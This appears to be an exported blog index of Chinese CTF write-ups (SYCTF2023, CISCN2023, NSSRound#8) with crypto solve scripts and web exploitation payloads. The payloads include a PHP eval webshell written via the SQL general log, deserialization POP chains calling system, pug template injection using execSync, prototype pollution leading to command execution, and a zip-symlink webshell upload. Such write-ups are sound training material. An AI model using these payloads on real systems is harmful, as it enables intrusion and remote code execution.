leak = 1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628 phi1 = (data1-1)*(data2-1) d1 = inverse_mod(data1,phi1) p_q = int(pow(leak,d1,data1*data2)) print(p_q) #p_q = 57684649402353527014234479338961992571416462151551812296301705975419997474236 之后解方程组得到p q ，最后RSA解密得到m再减去data2即可得到flag n = 2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517 p_q = 57684649402353527014234479338961992571416462151551812296301705975419997474236 p,q = var('p q') eq1 = p*q==n eq2 = p-q==p_q result = solve([eq1,eq2],p,q) print(result) #p = 89050782851818876669770322556796705712770640993210984822169118425068336611139 #q = 31366133449465349655535843217834713141354178841659172525867412449648339136903 import gmpy2 from Crypto.Util.number import long_to_bytes data2 = 67958620138887907577348085925738704755742144710390414146201367031822084270769 p = 89050782851818876669770322556796705712770640993210984822169118425068336611139 q = 31366133449465349655535843217834713141354178841659172525867412449648339136903 phi = (p-1)*(q-1) e = 65537 d = gmpy2.invert(e, int(phi)) c = 1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837 n = 2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517 m = pow(c,d,n) m = m - data2 print(long_to_bytes(m)) ","date":"2023-07-25","objectID":"/syctf2023/:1:1","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"CrazyTreat import gmpy2 from Crypto.Util.number import * c = 10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949 n = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209 p4 = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576 for i in range(200,256): PR.\u003cx\u003e = PolynomialRing(Zmod(n)) f = p4+x roots = f.small_roots(X=2^i, beta=0.4) if roots!=[]: p = p4+int(roots[0]) print(f'p = {p}') break q = n//p print(f'q = {q}') e = 65537 phi = (p-1)*(q-1) d = gmpy2.invert(e,int(phi)) m = pow(c,d,p*q) flag = long_to_bytes(int(m)) print(flag) ","date":"2023-07-25","objectID":"/syctf2023/:1:2","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"Alexei needs help from Crypto.Cipher import AES from binascii import unhexlify, hexlify from hashlib import md5 from Crypto.Util.number import * a = 12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215 b = 10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673 m = 9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817 seq = [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967] ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81 n = 2023 def seqsum(i): ans = 0 for j in range(len(seq)): ans += pow(i, j, m) * seq[j] return ans def homework_iter(n, a, b, m, seq): hw = [0] * (n+1) hw[1], hw[2] = 1, 1 for i in range(3, n+1): hw[i] = (a * hw[i-1] + b * hw[i-2] + seqsum(i)) % m return hw[n] def decrypt_homework(flag_cipher, key): aes = AES.new(k, AES.MODE_ECB) decrypted_data = aes.decrypt(long_to_bytes(flag_cipher)) return decrypted_data.rstrip(b\"\\x00\") ans = homework_iter(n, a, b, m, seq) k = md5(str(ans).encode()).digest() flag = decrypt_homework(ct, k) print(\"Flag:\", flag) ","date":"2023-07-25","objectID":"/syctf2023/:1:3","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"MISC ","date":"2023-07-25","objectID":"/syctf2023/:2:0","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"sudoku_easy 选择难度120，随便一个9x9答案，getshell读取flag ","date":"2023-07-25","objectID":"/syctf2023/:2:1","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"烦人的压缩包 foremost love.jpg得到一个压缩包，crc校验错误 Ook! 解码 ","date":"2023-07-25","objectID":"/syctf2023/:2:2","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"sudoku**_speedrun** #全局变量记录空位置（使用回溯法） indexList = [] #储存数独元素 inp = '''300001079 200000010 005402000 021903000 000000090 500004002 007800020 900005840 800000100'''.replace('\\n', '') sudoku = [[] for _ in range(9)] for i in range(9): sudoku[i] = [int(inp[i*9+j]) for j in range(9)] # --- 程序入口 --- # def main(): #寻找首个空元素 firstEmpty() #寻找末尾空元素 last = lastEmpty() m,n = last #当末尾空元素合法且不等于0时停止循环 while oneIsLegal(m,n) != True or sudoku[m][n] == 0: #获取栈顶元素 x,y = indexList[-1] #判断当前位置是否合法 if isLegal() == True and sudoku[x][y] \u003c= 9 and 0 \u003c sudoku[x][y]: #寻找下一个空元素 isEmpty() else: #不合法 - 回退 if sudoku[x][y] \u003e= 9: myReturn() myAdd() else: #不合法 - 自增 myAdd() myOutput() # --- 寻找第一个空元素位置 --- # def firstEmpty(): for i in range(0,9): for j in range(0,9): if sudoku[i][j] == 0: #'0' myPush([i,j]) return # --- 寻找最后一个空元素位置 --- # def lastEmpty(): for i in range(8,-1,-1): for j in range(8,-1,-1): if sudoku[i][j] == 0: #'0' return [i,j] # --- 位置判空加入栈中 --- # def isEmpty(): #获取栈顶元素 a,b = indexList[-1] #从下一元素开始找起 b += 1 for i in range(a,9): if i != a: b = 0 for j in range(b,9): if sudoku[i][j] == 0: #'0' myPush([i,j]) return # --- 入栈 --- # def myPush(coordinate): indexList.append(coordinate) # --- 出栈 --- # def myPop(): indexList.pop() # --- 当前位置自增 ---# def myAdd(): #获取栈顶元素 x,y = indexList[-1] sudoku[x][y] += 1 # --- 判断当前位置是否合法 --- # def isLegal(): #获取栈顶元素 x,y = indexList[-1] temp = sudoku[x][y] #判断该行是否重复 for i in range(9): if sudoku[x][i] == temp and i != y: return False; #当前位置不合法 #判断该列是否重复 for i in range(9): if sudoku[i][y] == temp and i != x: return False; #当前位置不合法 #判断该宫是否重复 xx = int(x / 3) yy = int(y / 3) for i in range(3): for j in range(3): if sudoku[xx * 3 + i][yy * 3 + j] == temp and (xx * 3 + i) != x and (yy * 3 + j) != y: return False; #当前位置不合法 return True #当前位置合法 # --- 判断某一位置是否合法 --- # def oneIsLegal(x,y): temp = sudoku[x][y] #判断该行是否重复 for i in range(9): if sudoku[x][i] == temp and i != y: return False; #当前位置不合法 #判断该列是否重复 for i in range(9): if sudoku[i][y] == temp and i != x: return False; #当前位置不合法 #判断该宫是否重复 xx = int(x / 3) yy = int(y / 3) for i in range(3): for j in range(3): if sudoku[xx * 3 + i][yy * 3 + j] == temp and (xx * 3 + i) != x and (yy * 3 + j) != y: return False; #当前位置不合法 return True #当前位置合法 # --- 回退函数 --- # def myReturn(): #获取栈顶元素 x,y = indexList[-1] sudoku[x][y] = 0 myPop() # --- 输出数独 --- # def myOutput(): print(\"答案为：\") for i in range(9): # print(sudoku[i]) for j in sudoku[i]: print(j, end='') print() if __name__ == \"__main__\": main() ","date":"2023-07-25","objectID":"/syctf2023/:2:3","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"web ","date":"2023-07-25","objectID":"/syctf2023/:3:0","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"CarelessPy https://www.o2takuxx.com/index.php/2023/06/11/syctf-2023-carelesspy/ /eval、/login、/download三个路由 /eval 猜猜是咋写的？ /login 登录页面，弱密码登录不了 /download 可利用目录穿越下载文件，通过eval路由发现/app/pycache/part.cpython-311.pyc 任意文件读取： http://47.108.165.60:42577/download?file=.%2F..%2F..%2F..%2F..%2Fapp%2F__pycache__%2Fpart.cpython-311.pyc pyc反编译：https://tool.lu/pyc/ 伪造session /login /th1s_1s_The_L4st_one 应该是XXE ","date":"2023-07-25","objectID":"/syctf2023/:3:1","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"Confronting robot myname存在sql注入点 得到路由/sEcR@t_n@Bodyknow.php，可直接执行sql select group_concat(table_name) from information_schema.tables where table_schema = database() 思路1 日志写马 开启全局的通用查询日志之后直接日志写马导致WEBSHELL set global general_log='on' set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php' 然后直接select记录一次马即可shell select \"\u003c?php eval($_POST['pass']);?\u003e\"; 蚁剑连接game.php得到flag 思路2 主从复制 无法直接insert数据，采取主从复制的方法 查看数据库版本： select version(); 在自己vps上起一个相同版本的mariadb，修改默认配置文件允许远程访问并启用二进制日志 vim /etc/mysql/my.conf server-id = 1 log_bin = /var/log/mysql/mariadb-bin service mysql restart 自己的vps作为主，题目环境作为从 主服务器执行 CREATE USER 'atest'@'%' IDENTIFIED BY 'testtest'; grant replication slave on . to 'atest'@'%'; flush privileges; # 复制从服务器上的数据结构 CREATE DATABASE IF NOT EXISTS game_data; use game_data CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ; # 记录file和position show master status; # mysql-bin.000001 1376 从服务器执行 CHANGE MASTER TO MASTER_HOST='主服务器ip', MASTER_USER='atest', MASTER_PASSWORD='testtest', MASTER_LOG_FILE='mariadb-bin.000001(记录的值)', MASTER_LOG_POS=1365(记录的值); start slave; show slave status # 显示连接成功 主服务器执行 INSERT INTO game ( round , choice ) VALUES ('1', 'R'), ('2', 'R'),('3', 'R'), ('4', 'R'),('5', 'R'), ('6', 'R'),('7', 'R'), ('8', 'R'),('9', 'R'), ('10', 'R'); 在开始挑战处输入答案即可获取flag ","date":"2023-07-25","objectID":"/syctf2023/:3:2","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"SleepWalker（java ","date":"2023-07-25","objectID":"/syctf2023/:3:3","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"4号的罗纳尔多 \u003c?php error_reporting(0); highlight_file(__FILE__); class evil{ public $cmd; public $a; public function __destruct(){ if('VanZZZZY' === preg_replace('/;+/','VanZZZZY',preg_replace('/[A-Za-z_\\(\\)]+/','',$this-\u003ecmd))){ eval($this-\u003ecmd.'givemegirlfriend!'); } else { echo 'nonono'; } } } if(!preg_match('/^[0a]:[\\d]+|Array|Iterator|object|List/i',$_GET['Pochy'])){ unserialize($_GET['Pochy']); } else { echo 'nonono'; } 无参rce 通过内置类splstack绕过匹配O开头的序列化数据； 通过__halt_compiler();来结束 php 代码执行流程，绕过givemegirlfriend!字符串的影响 \u003c?php class evil{ public $cmd; public $a; } $evilClass = new evil(); $evilClass-\u003ecmd = 'system(next(getallheaders()));__halt_compiler();'; $a = new SplStack(); $a -\u003e push($evilClass); echo serialize($a); （这里不知道为什么，参数是在倒数第二个数据那；next(getallheaders())应该是第二个？ ","date":"2023-07-25","objectID":"/syctf2023/:3:4","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"tasks 界面发现项目地址，代码审计，发现sqlite注入点 ","date":"2023-07-25","objectID":"/syctf2023/:3:5","tags":["ctf"],"title":"SYCTF2023","uri":"/syctf2023/"},{"categories":["ctf"],"content":"https://l1nyz-tel.cc/2023/6/25/CISCN2023-HN/ 只有web和pwn，还有一个re签到题（不会 ","date":"2023-07-19","objectID":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/:0:0","tags":["ctf"],"title":"CISCN2023华南分区赛","uri":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"categories":["ctf"],"content":"web ","date":"2023-07-19","objectID":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/:1:0","tags":["ctf"],"title":"CISCN2023华南分区赛","uri":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"categories":["ctf"],"content":"city_pop 知识点：引用绕过wakeup；序列化对象逃逸 \u003c?php error_reporting(0); function filter($str){ $str=str_replace(\"getflag\",'hark',$str); return $str; } class Start{ public $start; public $end; public function __construct($start,$end) { $this-\u003estart=$start; $this-\u003eend=$end; } } class Go{ public function __destruct() { echo $this-\u003eray; } } class Get{ public $func; public $name; public function __get($name) { call_user_func($this-\u003efunc,$name); } public function __toString() { $this-\u003ename-\u003e{$this-\u003efunc}; } } class Done{ public $eval; public $class; public $use; public $useless; public function __invoke() { $this-\u003euse=$this-\u003euseless; eval($this-\u003eeval); } public function __wakeup(){ $this-\u003eeval='no way'; } } if(isset($_GET['ciscn_huaibei.pop'])){ $pop=new start($_GET['ciscn_huaibei.pop'],$_GET['pop']); $ser=filter(serialize($pop)); unserialize($ser); }else{ highlight_file(__FILE__); } ?\u003e 思路一 利用链：Done.__invoke() \u003c– Get.__get() \u003c– Get.__toString() \u003c– Go.__destruct() 通过引用绕过wakeup $done = new Done(); $done-\u003euseless = 'phpinfo();'; $done-\u003eeval = \u0026$done-\u003euse; $get = new Get(); $get-\u003efunc = $done; $get2 = new Get(); $get2-\u003ename = $get; $go = new Go(); $go-\u003eray = $get2; $exp = serialize($go); O:2:\"Go\":1:{s:3:\"ray\";O:3:\"Get\":2:{s:4:\"func\";N;s:4:\"name\";O:3:\"Get\":2:{s:4:\"func\";O:4:\"Done\":4:{s:4:\"eval\";N;s:5:\"class\";N;s:3:\"use\";R:6;s:7:\"useless\";s:10:\"phpinfo();\";}s:4:\"name\";N;}}} 再通过filter函数导致序列化数据变短，覆盖部分数据，进行反序列化逃逸 ciscn_huaibei.pop为getflag，pop为上述序列化数据，过滤后如下 O:5:\"Start\":2:{s:5:\"start\";s:7:\"hark\";s:3:\"end\";s:187:\"O:2:\"Go\":1:{s:3:\"ray\";O:3:\"Get\":2:{s:4:\"func\";N;s:4:\"name\";O:3:\"Get\":2:{s:4:\"func\";O:4:\"Done\":4:{s:4:\"eval\";N;s:5:\"class\";N;s:3:\"use\";R:6;s:7:\"useless\";s:10:\"phpinfo();\";}s:4:\"name\";N;}}}\";} 要把\";s:3:\"end\";s:187:这部分覆盖掉，getflag变成hark缩短3位，故需要6个getflag 同时要满足end元素的值为序列化数据，序列化数据前添加;s:3:\"end\"; ;s:3:\"end\";O:2:\"Go\":1:{s:3:\"ray\";O:3:\"Get\":2:{s:4:\"func\";N;s:4:\"name\";O:3:\"Get\":2:{s:4:\"func\";O:4:\"Done\":4:{s:4:\"eval\";N;s:5:\"class\";N;s:3:\"use\";R:6;s:7:\"useless\";s:10:\"phpinfo();\";}s:4:\"name\";N;}}} 同时，引用在序列化中值R也要改变 直接构造$end=$go，序列化后发现引用值R为8 最后payload： ?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag\u0026pop=;s:3:\"end\";O:2:\"Go\":1:{s:3:\"ray\";O:3:\"Get\":2:{s:4:\"func\";N;s:4:\"name\";O:3:\"Get\":2:{s:4:\"func\";O:4:\"Done\":4:{s:4:\"eval\";N;s:5:\"class\";N;s:3:\"use\";R:8;s:7:\"useless\";s:10:\"phpinfo();\";}s:4:\"name\";N;}}} 思路二 利用链：Get.__get() \u003c– Get.__toString() \u003c– Go.__destruct() 直接用call_user_func执行命令，不用Done类，也就不用绕过wake了 $get = new Get(); $get1 = new Get(); $get1-\u003efunc = \"system\"; $get-\u003ename = $get1; $get-\u003efunc = \"whoami\"; $go = new Go(); $go-\u003eray = $get; 接着便是序列化对象逃逸 最后payload ?ciscn_huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflaggetflag\u0026pop=;;\";s:3:\"end\";O:2:\"Go\":1:{s:3:\"ray\";O:3:\"Get\":2:{s:4:\"func\";s:6:\"whoami\";s:4:\"name\";O:3:\"Get\":2:{s:4:\"func\";s:6:\"system\";s:4:\"name\";N;}}} fix 删掉$this-\u003euse=$this-\u003euseless; ","date":"2023-07-19","objectID":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/:1:1","tags":["ctf"],"title":"CISCN2023华南分区赛","uri":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"categories":["ctf"],"content":"emoji 数组绕过；pug模板注入 const express = require('express'); const ejs=require('ejs') const session = require('express-session'); const bodyParse = require('body-parser'); const pugjs=require('pug') function IfLogin(req, res, next){ if (req.session.user!=null){ next() }else { res.redirect('/login') } } admin={ \"username\":\"admin\", \"password\":\"😍😂😍😒😘💕😁🙌\" } app=express() app.use(express.json()); app.use(bodyParse.urlencoded({extended: false})); app.set('view engine', 'ejs'); app.use(session({ secret: '**************', resave: false, saveUninitialized: true, cookie: { maxAge: 3600 * 1000 } })); app.get('/',IfLogin,(req,res)=\u003e{ res.send('if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !') }) app.get('/login',(req,res)=\u003e{ console.log(req.session.user) res.render('login') }) app.post('/login',(req,res)=\u003e{ var username=req.body.username var password=req.body.password if(username||password){ if(username.includes('ad')){ res.send('you not the true admin') }else { if(username.toString().substring(0,2)===admin.username.substring(0,2)\u0026\u0026password===admin.password.substring(1,15)){ console.log(1) req.session.user={'username':username,'isadmin':'1'} console.log(2) }else { req.session.user={'username':username} } res.redirect('/') } } else { res.send('please enter usrname or password') } }) app.get('/admin',IfLogin,(req,res)=\u003e{ if (req.session.user.isadmin==='1'){ var hello='welcome '+req.session.user.username res.send (pugjs.render(hello)) } res.send('you are not admin') }) app.listen('80', () =\u003e { console.log(`Example app listening at http://localhost:80`) }) 判断条件： username.toString().substring(0,2)===admin.username.substring(0,2)\u0026\u0026password===admin.password.substring(1,15) 数组配合toString绕过 json提交 data={ \"username\":[\"admin\"], \"password\":\"\\ude0d😂😍😒😘💕😁\\ud83d\" } res.send (pugjs.render(hello))，存在pug模板注入，hello包含username 最后payload： import requests url=\"http://127.0.0.1\" s = requests.Session() #创建一个session data={ \"username\":[\"admin\",\"#{global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()}\"], \"password\":\"\\ude0d😂😍😒😘💕😁\\ud83d\" } r=s.post(url=url+\"/login\",json=data) print(r.text) r=s.get(url=url+\"/admin\") print(r.text) fix pug ssti黑名单 ","date":"2023-07-19","objectID":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/:1:2","tags":["ctf"],"title":"CISCN2023华南分区赛","uri":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"categories":["ctf"],"content":"pollution 原型链污染；readFileSync绕过 const expres=require('express') const JSON5 = require('json5'); const bodyParser = require('body-parser') var fs = require(\"fs\"); const session = require('express-session') const rand = require('string-random') var cookieParser = require('cookie-parser'); const SECRET = rand(32, '0123456789abcdef') const port=80 const app=expres() app.use(bodyParser.urlencoded({ extended: false })) app.use(bodyParser.json()) app.use(session({ secret: SECRET, resave: false, saveUninitialized: true, cookie: { maxAge: 3600 * 1000 } })); app.use(cookieParser()); function waf(obj, arr){ let verify = true; Object.keys(obj).forEach((key) =\u003e { if (arr.indexOf(key) \u003e -1) { verify = false; } }); return verify; } app.get('/',(req,res)=\u003e{ res.send('hellllllo!') }) app.post('/login',(req,res)=\u003e{ let userinfo=JSON.stringify(req.body) const user = JSON5.parse(userinfo) if (waf(user, ['admin'])) { req.session.user = user if(req.session.user.admin==true){ req.session.user='admin' } res.send('login success!') } else { res.send('login error!') } }) app.post('/dosometing',(req,res)=\u003e{ if (req.session.user === 'admin'){ if(JSON.stringify(req.body.file).includes(\"flag\")){ req.body.file='' } const flag=fs.readFileSync(req.body.file) res.send(flag.toString()) } else{ res.send('you are not admin') } }) app.get('/for_check',(req,res)=\u003e{ res.send(fs.readFileSync('/app/app.js').toString()) }) app.listen(port, () =\u003e { console.log(`Example app listening on port ${port}`) }) 原型链污染 { “username\":\"mof\", \"__proto__\":{\"admin\":True} } readFileSync绕过 https://cloud.tencent.com/developer/article/2123023 { \"file\":{ \"href\":\"mof\", \"origin\":\"mof\", \"protocol\":\"file:\", \"hostname\":\"\", \"pathname\":\"/fl%61g.txt\" } } payload: import requests url1=\"http://127.0.0.1/login\" url2=\"http://127.0.0.1/dosometing\" data={ \"username\":\"mof\", \"__proto__\":{\"admin\":True} } s=requests.session() r=s.post(url=url1,json=data) print(r.text) r=s.post(url=url2,json={ \"file\":{ \"href\":\"mof\", \"origin\":\"mof\", \"protocol\":\"file:\", \"hostname\":\"\", \"pathname\":\"/fl%61g.txt\" # url编码绕过匹配 } }) print(r.text) fix JSON5.parse 改成 JSON.parse 即可 ","date":"2023-07-19","objectID":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/:1:3","tags":["ctf"],"title":"CISCN2023华南分区赛","uri":"/ciscn2023-%E5%8D%8E%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9B/"},{"categories":["ctf"],"content":"web ","date":"2023-07-17","objectID":"/nssround#8-basic/:1:0","tags":["ctf"],"title":"NSSRound#8 Basic","uri":"/nssround#8-basic/"},{"categories":["ctf"],"content":"ez_node 原型链污染 server.js const express = require(\"express\"); const path = require(\"path\"); const fs = require(\"fs\"); const multer = require(\"multer\"); const PORT = process.env.port || 3000 const app = express(); global = \"global\" app.listen(PORT, () =\u003e { console.log(`listen at ${PORT}`); }); function merge(target, source) { for (let key in source) { if (key in source \u0026\u0026 key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } let objMulter = multer({ dest: \"./upload\" }); app.use(objMulter.any()); app.use(express.static(\"./public\")); app.post(\"/upload\", (req, res) =\u003e { try{ let oldName = req.files[0].path; let newName = req.files[0].path + path.parse(req.files[0].originalname).ext; fs.renameSync(oldName, newName); res.send({ err: 0, url: \"./upload/\" + req.files[0].filename + path.parse(req.files[0].originalname).ext }); } catch(error){ res.send(require('./err.js').getRandomErr()) } }); app.post('/pollution', require('body-parser').json(), (req, res) =\u003e { let data = {}; try{ merge(data, req.body); res.send('Register successfully!tql') require('./err.js').getRandomErr() } catch(error){ res.send(require('./err.js').getRandomErr()) } }) https://l1nyz-tel.cc/2023/2/11/NSSCTF-Round-8-web/ merge存在原型链污染，再加上require('./err.js') preinstall.js if (process.env.npm_config_global) { var cp = require('child_process'); var fs = require('fs'); var path = require('path'); try { var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], { encoding: 'utf8', stdio: ['ignore', undefined, 'ignore'], }).replace(/\\n/g, ''); var manifest = require('./package.json'); var binNames = typeof manifest.bin === 'string' ? [manifest.name.replace(/^@[^\\/]+\\//, '')] : typeof manifest.bin === 'object' \u0026\u0026 manifest.bin !== null ? Object.keys(manifest.bin) : []; binNames.forEach(function (binName) { var binPath = path.join(targetPath, binName); var binTarget; try { binTarget = fs.readlinkSync(binPath); } catch (err) { return; } if (binTarget.startsWith('../lib/node_modules/pmm/')) { try { fs.unlinkSync(binPath); } catch (err) { return; } } }); } catch (err) { // ignore errors } } 先上传 preinstall.js，得到路径 ./upload/67ca744f2a2ff94cf82c51bd93540365.js 再污染原型链，得到flag { \"__proto__\": { \"data\": { \"name\": \"./err.js\", \"exports\": { \".\": \"./67ca744f2a2ff94cf82c51bd93540365.js\" } }, \"path\": \"./upload\", \"npm_config_global\": 1, \"npm_execpath\": \"--eval=require('child_process').execSync('cp${IFS}/flag${IFS}/app/public/flag.html')\" }, \"x\": null } ","date":"2023-07-17","objectID":"/nssround#8-basic/:1:1","tags":["ctf"],"title":"NSSRound#8 Basic","uri":"/nssround#8-basic/"},{"categories":["ctf"],"content":"wp：https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:0:0","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"Web ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:0","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"unzip \u003c?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){ exec('cd /tmp \u0026\u0026 unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]); }; //only this! 构造软连接： ln -s /var/www/html test zip --symlinks test.zip ./* 上传解压后/var/www/html指向test目录 构造木马： mkdir test echo \"\u003c?php @eval($_GET['cmd']);\" \u003e test/cmd.php zip -r test1.zip ./* 上传解压后可访问test目录下的木马 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:1","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"dumpit 过滤的符号： /?db=bibin\u0026table_2_dump=%00 /?db=bibin\u0026table_2_dump=%0a 发现%0a闭合能执行命令，在env发现flag /?db=q\u0026table_2_dump=%0awhoami%0a /?db=q\u0026table_2_dump=%0env%0a //环境变量 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:2","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"go_session https://un1novvn.github.io/2023/05/29/ciscn2023/ https://ctf.njupt.edu.cn/archives/898#go_session 看官方文档 pongo 环境 route.go package route import ( \"github.com/flosch/pongo2/v4\" \"github.com/gin-gonic/gin\" \"github.com/gorilla/sessions\" \"html\" \"io\" \"net/http\" ) var store = sessions.NewCookieStore([]byte(\"\")) func Index(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { session.Values[\"name\"] = \"admin\" err = session.Save(c.Request, c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, \"Hello, guest\") } func Admin(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] != \"admin\" { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } name := c.DefaultQuery(\"name\", \"ssti\") xssWaf := html.EscapeString(name) tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\") //tpl, err := pongo2.FromString(\"Hello \" + name + \"!\") if err != nil { panic(err) } out, err := tpl.Execute(pongo2.Context{\"c\": c}) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } c.String(200, out) } func Flask(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { if err != nil { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } } resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\")) if err != nil { return } defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) c.String(200, string(body)) } main.go package main import ( \"github.com/gin-gonic/gin\" \"main/route\" ) func main() { r := gin.Default() r.GET(\"/\", route.Index) r.GET(\"/admin\", route.Admin) r.GET(\"/flask\", route.Flask) r.Run(\"0.0.0.0:80\") } app.py # -*- coding: utf-8 -*- from flask import Flask app = Flask(__name__) d = { \"h\": \"hello world!\" } @app.route(\"/\") def hello(): return \"hello\" if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=5000, debug=True) 有三个路由，index、admin和flask session检测，key为空，直接本地起环境（像index里面一样设置session Cookie:session-name=MTY4OTIxMzM0M3xEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXx-9wDJrv63GGaUmQnK_0WvaRL62AHGIY1IRVS4IdZ39Q== admin有ssti注入，admin中out, err := tpl.Execute(pongo2.Context{\"c\": c})的c为传入的变量c *gin.Context 